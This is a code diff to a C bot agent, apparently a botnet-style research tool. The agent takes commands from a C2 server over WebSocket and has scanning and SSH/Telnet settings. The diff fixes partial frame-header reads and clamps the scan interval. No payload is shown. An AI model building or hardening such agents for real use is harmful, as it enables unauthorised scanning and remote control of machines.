@@ -994,14 +994,20 @@ int ws_read(notnet_bot_t *bot, char *buf, int len) {
 
     if (select(bot->c2_ws.sock + 1, &fds, NULL, NULL, &tv) <= 0) return 0;
 
-    /* Read frame header (2 bytes minimum) */
-    uint8_t frame_hdr[2];
-    int r = recv(bot->c2_ws.sock, frame_hdr, 2, 0);
-    if (r <= 0) {
-        bot->c2_ws.connected = 0;
-        if (bot->c2_ws.sock >= 0) close(bot->c2_ws.sock);
-        bot->c2_ws.sock = -1;
-        return -1;
+    /* SECURITY FIX (#40): read the full 2-byte frame header. A single
+     * recv() can return 1 byte (partial read) — frame_hdr[1] would stay
+     * uninitialized and the opcode/length parse below would use garbage. */
+    uint8_t frame_hdr[2] = {0, 0};
+    size_t hdr_got = 0;
+    while (hdr_got < sizeof(frame_hdr)) {
+        ssize_t r = recv(bot->c2_ws.sock, frame_hdr + hdr_got, sizeof(frame_hdr) - hdr_got, 0);
+        if (r <= 0) {
+            bot->c2_ws.connected = 0;
+            if (bot->c2_ws.sock >= 0) close(bot->c2_ws.sock);
+            bot->c2_ws.sock = -1;
+            return -1;
+        }
+        hdr_got += (size_t)r;
     }
 
     int fin = (frame_hdr[0] & 0x80) >> 7;
@@ -1473,10 +1479,20 @@ int protocol_process_commands(notnet_bot_t *bot) {
             protocol_send_response(bot, CMD_REBOOT, "reboot: received");
             /* Do not actually reboot — this is a research tool */
         } else if (strncmp(cmd, CMD_SLEEP, strlen(CMD_SLEEP)) == 0) {
+            /* SECURITY FIX (#36): Clamp the interval. A raw atoi() with
+             * no bounds lets the C2 set scan_interval to a huge value
+             * (or 0) — uint32 wrap and usleep(interval*1000000) freeze
+             * the agent. Accept 1..3600 like config_set does. */
             char *interval = strchr(cmd, ' ');
             if (interval) {
-                bot->scan_interval = atoi(interval + 1);
-                log_info("CMD: sleep interval set to %d", bot->scan_interval);
+                int v = atoi(interval + 1);
+                if (v >= 1 && v <= 3600) {
+                    bot->scan_interval = (uint32_t)v;
+                    log_info("CMD: sleep interval set to %d", bot->scan_interval);
+                } else {
+                    log_warn("CMD: sleep interval rejected (must be 1-3600): %d", v);
+                    protocol_send_response(bot, CMD_SLEEP, "sleep: interval rejected (1-3600)");
+                }
             }
         } else if (strncmp(cmd, CMD_CONFIG_SET, strlen(CMD_CONFIG_SET)) == 0) {
             /* SECURITY FIX (#7): Implement config_set with allowlist
@@ -1933,7 +1949,16 @@ int load_config(notnet_bot_t *bot, const char *path) {
         } else if (strcmp(key, "http_port") == 0) {
             bot->c2_http.port = atoi(value);
         } else if (strcmp(key, "scan_interval") == 0) {
-            bot->scan_interval = atoi(value);
+            /* SECURITY FIX (#48): clamp scan_interval on load. A config
+             * value of 0 made the main loop usleep(0) → busy-loop into
+             * an unthrottled scan storm. Accept 1..3600 seconds. */
+            int v = atoi(value);
+            if (v >= 1 && v <= 3600) {
+                bot->scan_interval = (uint32_t)v;
+            } else {
+                log_warn("Config: scan_interval=%d out of range (1-3600), keeping %u",
+                         v, bot->scan_interval);
+            }
         } else if (strcmp(key, "ssh_enabled") == 0) {
             bot->ssh_enabled = atoi(value);
         } else if (strcmp(key, "telnet_enabled") == 0) {
